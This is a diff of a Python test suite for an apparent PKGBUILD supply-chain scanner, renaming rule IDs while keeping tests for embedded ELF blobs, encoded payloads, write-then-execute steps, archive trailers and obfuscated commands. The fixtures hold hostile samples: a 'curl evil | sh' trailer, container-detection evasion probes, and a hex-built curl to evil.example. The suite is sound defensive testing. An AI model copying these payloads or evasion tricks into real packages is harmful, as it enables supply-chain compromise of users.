@@ -1,9 +1,9 @@
-"""Behavioural tests for the Phase 2 July delivery stack (R118-R122, R124).
+"""Behavioural tests for the Phase 2 July delivery stack (H066-H070, H072).
 
 Each rule is asserted in both directions: the attack case fires, and the
-plan's declared must-not-fire surface stays silent.  R118-blob (an ELF blob
-in the PKGBUILD) is R120's job, so the two never double-fire on the same
-evidence; R118 here is the tree-variant manifest scan.
+plan's declared must-not-fire surface stays silent.  H066-blob (an ELF blob
+in the PKGBUILD) is H068's job, so the two never double-fire on the same
+evidence; H066 here is the tree-variant manifest scan.
 """
 
 import base64
@@ -35,21 +35,21 @@ def rule_ids(findings: list[dict]) -> set[str]:
     return {f["rule_id"] for f in findings}
 
 
-# --- R118-tree: embedded binary in the repository manifest ---
+# --- H066-tree: embedded binary in the repository manifest ---
 
 
-def test_r118_fires_on_committed_elf():
+def test_h066_fires_on_committed_elf():
     files = [("evil", _ELF), ("PKGBUILD", b"pkgname=x\n")]
-    assert rule_ids(scan_tree_manifest(files, [])) == {"R118"}
+    assert rule_ids(scan_tree_manifest(files, [])) == {"H066"}
 
 
-def test_r118_ignores_declared_source_binary():
+def test_h066_ignores_declared_source_binary():
     files = [("appimage-tool", _ELF), ("PKGBUILD", b"pkgname=x\n")]
     url = "https://example.com/download/appimage-tool"
     assert scan_tree_manifest(files, [url]) == []
 
 
-def test_r118_ignores_icons_fonts_desktop():
+def test_h066_ignores_icons_fonts_desktop():
     files = [
         ("icons/app.png", b"\x89PNG\r\n\x1a\n" + b"\x00" * 32),
         ("fonts/font.ttf", b"\x00\x01\x00\x00" + b"\x00" * 32),
@@ -58,17 +58,17 @@ def test_r118_ignores_icons_fonts_desktop():
     assert scan_tree_manifest(files, []) == []
 
 
-def test_r118_ignores_test_fixture_binaries():
+def test_h066_ignores_test_fixture_binaries():
     files = [("tests/fixtures/sample.bin", _ELF), ("fixtures/hello", _ELF)]
     assert scan_tree_manifest(files, []) == []
 
 
-def test_r118_ignores_non_elf_tree():
+def test_h066_ignores_non_elf_tree():
     files = [("Makefile", b"all:\n"), ("src/main.c", b"int main(void){}\n")]
     assert scan_tree_manifest(files, []) == []
 
 
-def test_r118_blob_is_r120_not_r118():
+def test_h066_blob_is_h068_not_h066():
     diff = f"""--- a/PKGBUILD
 +++ b/PKGBUILD
 @@ -1,4 +1,5 @@
@@ -77,11 +77,11 @@ def test_r118_blob_is_r120_not_r118():
 +payload="{_B64_ELF}"
 """
     ids = rule_ids(structural(diff))
-    assert "R120" in ids
-    assert "R118" not in ids
+    assert "H068" in ids
+    assert "H066" not in ids
 
 
-# --- R119: anti-analysis check ---
+# --- H067: anti-analysis check ---
 
 
 @pytest.mark.parametrize("line", [
@@ -94,7 +94,7 @@ def test_r118_blob_is_r120_not_r118():
     'test -f /.dockerenv && exit',
     'ls /run/.containerenv',
 ])
-def test_r119_fires_on_anti_analysis(line):
+def test_h067_fires_on_anti_analysis(line):
     diff = f"""--- a/PKGBUILD
 +++ b/PKGBUILD
 @@ -1,3 +1,4 @@
@@ -104,7 +104,7 @@ def test_r119_fires_on_anti_analysis(line):
 +  {line}
 +}}
 """
-    assert "R119" in rule_ids(structural(diff))
+    assert "H067" in rule_ids(structural(diff))
 
 
 @pytest.mark.parametrize("line", [
@@ -113,7 +113,7 @@ def test_r119_fires_on_anti_analysis(line):
     'arch=$(uname -m)',
     'case "$(getconf LONG_BIT)" in 64) : ;; esac',
 ])
-def test_r119_ignores_arch_checks(line):
+def test_h067_ignores_arch_checks(line):
     diff = f"""--- a/PKGBUILD
 +++ b/PKGBUILD
 @@ -1,3 +1,4 @@
@@ -123,10 +123,10 @@ def test_r119_ignores_arch_checks(line):
 +  {line}
 +}}
 """
-    assert "R119" not in rule_ids(structural(diff))
+    assert "H067" not in rule_ids(structural(diff))
 
 
-def test_r119_ignores_probe_in_heredoc_data():
+def test_h067_ignores_probe_in_heredoc_data():
     diff = """--- a/PKGBUILD
 +++ b/PKGBUILD
 @@ -1,3 +1,6 @@
@@ -138,7 +138,7 @@ def test_r119_ignores_probe_in_heredoc_data():
 +EOF
 +}
 """
-    assert "R119" not in rule_ids(structural(diff))
+    assert "H067" not in rule_ids(structural(diff))
 
 
 def test_find_line_in_diff_survives_a_lone_trailing_backslash():
@@ -161,10 +161,10 @@ def test_find_line_in_diff_survives_a_lone_trailing_backslash():
     assert find_line_in_diff(diff, "full/source/url") == 3
 
 
-# --- R120: reconstructed-executable payload ---
+# --- H068: reconstructed-executable payload ---
 
 
-def test_r120_fires_on_base64_elf():
+def test_h068_fires_on_base64_elf():
     diff = f"""--- a/PKGBUILD
 +++ b/PKGBUILD
 @@ -1,3 +1,4 @@
@@ -173,10 +173,10 @@ def test_r120_fires_on_base64_elf():
 +payload="{_B64_ELF}"
 """
     findings = structural(diff)
-    assert "R120" in rule_ids(findings)
+    assert "H068" in rule_ids(findings)
 
 
-def test_r120_fires_on_hex_shebang():
+def test_h068_fires_on_hex_shebang():
     diff = """--- a/PKGBUILD
 +++ b/PKGBUILD
 @@ -1,3 +1,4 @@
@@ -184,7 +184,7 @@ def test_r120_fires_on_hex_shebang():
  pkgver=1.0
 +payload="23212f62696e2f73680a6563686f20706f776e6564"
 """
-    assert "R120" in rule_ids(structural(diff))
+    assert "H068" in rule_ids(structural(diff))
 
 
 @pytest.mark.parametrize("line", [
@@ -192,7 +192,7 @@ def test_r120_fires_on_hex_shebang():
     'sha256sums=("' + "a" * 64 + '")',        # checksum
     'key="' + base64.b64encode(b"x" * 40).decode() + '"',  # symmetric key bytes
 ])
-def test_r120_ignores_encoded_text_checksums_keys(line):
+def test_h068_ignores_encoded_text_checksums_keys(line):
     diff = f"""--- a/PKGBUILD
 +++ b/PKGBUILD
 @@ -1,3 +1,4 @@
@@ -200,10 +200,10 @@ def test_r120_ignores_encoded_text_checksums_keys(line):
  pkgver=1.0
 +{line}
 """
-    assert "R120" not in rule_ids(structural(diff))
+    assert "H068" not in rule_ids(structural(diff))
 
 
-def test_r120_fires_on_uuencoded_block():
+def test_h068_fires_on_uuencoded_block():
     payload = b"#!/bin/sh\necho pwnd\n"
     uu = binascii.b2a_uu(payload).decode("latin-1").rstrip("\n")
     diff = f"""--- a/PKGBUILD
@@ -219,13 +219,13 @@ def test_r120_fires_on_uuencoded_block():
 +EOF
 +}}
 """
-    assert "R120" in rule_ids(structural(diff))
+    assert "H068" in rule_ids(structural(diff))
 
 
-# --- R121: build-time generation then execution ---
+# --- H069: build-time generation then execution ---
 
 
-def test_r121_fires_on_heredoc_generate_execute():
+def test_h069_fires_on_heredoc_generate_execute():
     diff = """--- a/PKGBUILD
 +++ b/PKGBUILD
 @@ -1,3 +1,9 @@
@@ -238,10 +238,10 @@ def test_r121_fires_on_heredoc_generate_execute():
 +  bash evil.sh
 +}
 """
-    assert "R121" in rule_ids(structural(diff))
+    assert "H069" in rule_ids(structural(diff))
 
 
-def test_r121_fires_on_printf_write_then_run():
+def test_h069_fires_on_printf_write_then_run():
     diff = """--- a/PKGBUILD
 +++ b/PKGBUILD
 @@ -1,3 +1,5 @@
@@ -252,10 +252,10 @@ def test_r121_fires_on_printf_write_then_run():
 +  sh /tmp/x.sh
 +}
 """
-    assert "R121" in rule_ids(structural(diff))
+    assert "H069" in rule_ids(structural(diff))
 
 
-def test_r121_fires_on_generated_source_compiled():
+def test_h069_fires_on_generated_source_compiled():
     diff = """--- a/PKGBUILD
 +++ b/PKGBUILD
 @@ -1,3 +1,6 @@
@@ -266,10 +266,10 @@ def test_r121_fires_on_generated_source_compiled():
 +  gcc -o evil evil.c
 +}
 """
-    assert "R121" in rule_ids(structural(diff))
+    assert "H069" in rule_ids(structural(diff))
 
 
-def test_r121_ignores_config_consumed_by_build_step():
+def test_h069_ignores_config_consumed_by_build_step():
     diff = """--- a/PKGBUILD
 +++ b/PKGBUILD
 @@ -1,3 +1,9 @@
@@ -283,10 +283,10 @@ def test_r121_ignores_config_consumed_by_build_step():
 +  install -Dm644 extra.conf "$pkgdir/etc/extra.conf"
 +}
 """
-    assert "R121" not in rule_ids(structural(diff))
+    assert "H069" not in rule_ids(structural(diff))
 
 
-# --- R122: archive trailer anomaly ---
+# --- H070: archive trailer anomaly ---
 
 
 def _gzip_tar(members: dict[str, bytes]) -> bytes:
@@ -309,23 +309,23 @@ def _plain_tar(members: dict[str, bytes]) -> bytes:
     return raw.getvalue()
 
 
-def test_r122_gzip_with_appended_payload():
+def test_h070_gzip_with_appended_payload():
     clean = _gzip_tar({"PKGBUILD": b"pkgname=x\n"})
     tampered = clean + b"#!/bin/sh\ncurl evil | sh\n"
     finding = check_archive_trailer(tampered)
     assert finding is not None
-    assert finding["rule_id"] == "R122"
+    assert finding["rule_id"] == "H070"
     assert finding["params"]["kind"] == "gzip"
     assert check_archive_trailer(clean) is None
 
 
-def test_r122_gzip_concatenated_members_is_clean():
+def test_h070_gzip_concatenated_members_is_clean():
     member = gzip.compress(b"one", mtime=0)
     concatenated = member + member
     assert check_archive_trailer(concatenated) is None
 
 
-def test_r122_plain_tar_with_appended_payload():
+def test_h070_plain_tar_with_appended_payload():
     clean = _plain_tar({"PKGBUILD": b"pkgname=x\n"})
     tampered = clean + b"PAYLOAD"
     finding = check_archive_trailer(tampered)
@@ -334,7 +334,7 @@ def test_r122_plain_tar_with_appended_payload():
     assert check_archive_trailer(clean) is None
 
 
-def test_r122_zip_with_trailing_data():
+def test_h070_zip_with_trailing_data():
     raw = io.BytesIO()
     with zipfile.ZipFile(raw, "w") as zf:
         zf.writestr("PKGBUILD", "pkgname=x\n")
@@ -346,16 +346,16 @@ def test_r122_zip_with_trailing_data():
     assert check_archive_trailer(clean) is None
 
 
-def test_r122_ignores_truncated_or_garbage_input():
+def test_h070_ignores_truncated_or_garbage_input():
     assert check_archive_trailer(b"") is None
     assert check_archive_trailer(b"not an archive") is None
     assert check_archive_trailer(b"\x1f\x8b\x08" + b"\x00" * 8) is None
 
 
-# --- R124: write-then-execute ---
+# --- H072: write-then-execute ---
 
 
-def test_r124_fires_on_install_then_run():
+def test_h072_fires_on_install_then_run():
     diff = """--- a/PKGBUILD
 +++ b/PKGBUILD
 @@ -1,3 +1,5 @@
@@ -366,10 +366,10 @@ def test_r124_fires_on_install_then_run():
 +  /tmp/payload
 +}
 """
-    assert "R124" in rule_ids(structural(diff))
+    assert "H072" in rule_ids(structural(diff))
 
 
-def test_r124_ignores_writes_to_pkgdir():
+def test_h072_ignores_writes_to_pkgdir():
     diff = """--- a/PKGBUILD
 +++ b/PKGBUILD
 @@ -1,3 +1,6 @@
@@ -380,10 +380,10 @@ def test_r124_ignores_writes_to_pkgdir():
 +  install -Dm644 icon.png "$pkgdir/usr/share/icons/icon.png"
 +}
 """
-    assert "R124" not in rule_ids(structural(diff))
+    assert "H072" not in rule_ids(structural(diff))
 
 
-def test_r124_ignores_declared_source_execution():
+def test_h072_ignores_declared_source_execution():
     diff = """--- a/PKGBUILD
 +++ b/PKGBUILD
 @@ -1,3 +1,8 @@
@@ -394,10 +394,10 @@ def test_r124_ignores_declared_source_execution():
 +  bash tool.sh
 +}
 """
-    assert "R124" not in rule_ids(structural(diff))
+    assert "H072" not in rule_ids(structural(diff))
 
 
-def test_r124_ignores_configure_make_flow():
+def test_h072_ignores_configure_make_flow():
     diff = """--- a/PKGBUILD
 +++ b/PKGBUILD
 @@ -1,3 +1,7 @@
@@ -409,10 +409,10 @@ def test_r124_ignores_configure_make_flow():
 +  make
 +}
 """
-    assert "R124" not in rule_ids(structural(diff))
+    assert "H072" not in rule_ids(structural(diff))
 
 
-def test_r121_fires_on_generated_configure_executed():
+def test_h069_fires_on_generated_configure_executed():
     diff = """--- a/PKGBUILD
 +++ b/PKGBUILD
 @@ -1,3 +1,7 @@
@@ -424,10 +424,10 @@ def test_r121_fires_on_generated_configure_executed():
 +  make
 +}
 """
-    assert "R121" in rule_ids(structural(diff))
+    assert "H069" in rule_ids(structural(diff))
 
 
-def test_r121_precedes_r124_no_double_fire():
+def test_h069_precedes_h072_no_double_fire():
     diff = """--- a/PKGBUILD
 +++ b/PKGBUILD
 @@ -1,3 +1,9 @@
@@ -441,14 +441,14 @@ def test_r121_precedes_r124_no_double_fire():
 +}
 """
     ids = rule_ids(structural(diff))
-    assert "R121" in ids
-    assert "R124" not in ids
+    assert "H069" in ids
+    assert "H072" not in ids
 
 
 # --- tree-manifest plumbing through the analysis entry points ---
 
 
-def test_scan_diff_fires_r118_with_tree_manifest():
+def test_scan_diff_fires_h066_with_tree_manifest():
     from trustsight.analysis.pipeline import scan_diff
 
     diff = """--- a/PKGBUILD
@@ -460,7 +460,7 @@ def test_scan_diff_fires_r118_with_tree_manifest():
 """
     fact = scan_diff(diff, config={}, tree_manifest=[("evil", _ELF)])
     ids = {e.rule_id for e in fact.score_breakdown}
-    assert "R118" in ids
+    assert "H066" in ids
     assert fact.tree_analyzed
 
 
@@ -476,10 +476,10 @@ def test_scan_diff_reports_reduced_coverage_without_tree():
 """
     fact = scan_diff(diff, config={})
     assert not fact.tree_analyzed
-    assert "R118" not in {e.rule_id for e in fact.score_breakdown}
+    assert "H066" not in {e.rule_id for e in fact.score_breakdown}
 
 
-# --- R117: the reconstruction itself is a reported fact ---
+# --- H065: the reconstruction itself is a reported fact ---
 
 
 @pytest.mark.parametrize("obfuscated,revealed", [
@@ -488,7 +488,7 @@ def test_scan_diff_reports_reduced_coverage_without_tree():
     ("b''u''n install -g evil", "bun"),
     (r"$(printf '\x63\x75\x72\x6c') https://evil.example/x", "curl"),
 ])
-def test_r117_reports_what_the_line_was_read_as(obfuscated, revealed):
+def test_h065_reports_what_the_line_was_read_as(obfuscated, revealed):
     diff = f"""--- a/PKGBUILD
 +++ b/PKGBUILD
 @@ -1,3 +1,5 @@
@@ -497,16 +497,16 @@ def test_r117_reports_what_the_line_was_read_as(obfuscated, revealed):
 +  {obfuscated}
 +}}
 """
-    findings = [f for f in structural(diff) if f["rule_id"] == "R117"]
+    findings = [f for f in structural(diff) if f["rule_id"] == "H065"]
     assert findings, obfuscated
     assert findings[0]["severity"] == "INFO"
     assert findings[0]["params"]["revealed"] == revealed
     assert findings[0]["params"]["reconstructed"] is True
 
 
-def test_r117_reconstruction_reaches_the_rule_that_matches_on_it():
-    """R081 matches the reconstructed text; R117 is what tells the reader
-    the file does not literally contain the word R081 quoted."""
+def test_h065_reconstruction_reaches_the_rule_that_matches_on_it():
+    """H035 matches the reconstructed text; H065 is what tells the reader
+    the file does not literally contain the word H035 quoted."""
     diff = """--- a/PKGBUILD
 +++ b/PKGBUILD
 @@ -1,3 +1,5 @@
@@ -515,10 +515,10 @@ def test_r117_reconstruction_reaches_the_rule_that_matches_on_it():
 +  $'\\x62\\x75\\x6e' install -g nextfile-js
 +}
 """
-    assert {"R081", "R117"} <= rule_ids(structural(diff))
+    assert {"H035", "H065"} <= rule_ids(structural(diff))
 
 
-def test_r117_reports_an_unreconstructable_literal_as_inconclusive():
+def test_h065_reports_an_unreconstructable_literal_as_inconclusive():
     diff = """--- a/PKGBUILD
 +++ b/PKGBUILD
 @@ -1,3 +1,4 @@
@@ -527,7 +527,7 @@ def test_r117_reports_an_unreconstructable_literal_as_inconclusive():
 +  eval $'\\x62\\x75\\x6e
 +}
 """
-    findings = [f for f in structural(diff) if f["rule_id"] == "R117"]
+    findings = [f for f in structural(diff) if f["rule_id"] == "H065"]
     assert findings
     assert findings[0]["params"]["reconstructed"] is False
 
@@ -538,7 +538,7 @@ def test_r117_reports_an_unreconstructable_literal_as_inconclusive():
     "grep '/Windows/Fonts/.*[cf]$' list",
     "install -Dm755 app \"$pkgdir/usr/bin/app\"",
 ])
-def test_r117_quiet_on_ordinary_shell(line):
+def test_h065_quiet_on_ordinary_shell(line):
     diff = f"""--- a/PKGBUILD
 +++ b/PKGBUILD
 @@ -1,3 +1,4 @@
@@ -547,4 +547,4 @@ def test_r117_quiet_on_ordinary_shell(line):
 +  {line}
 +}}
 """
-    assert "R117" not in rule_ids(structural(diff))
+    assert "H065" not in rule_ids(structural(diff))
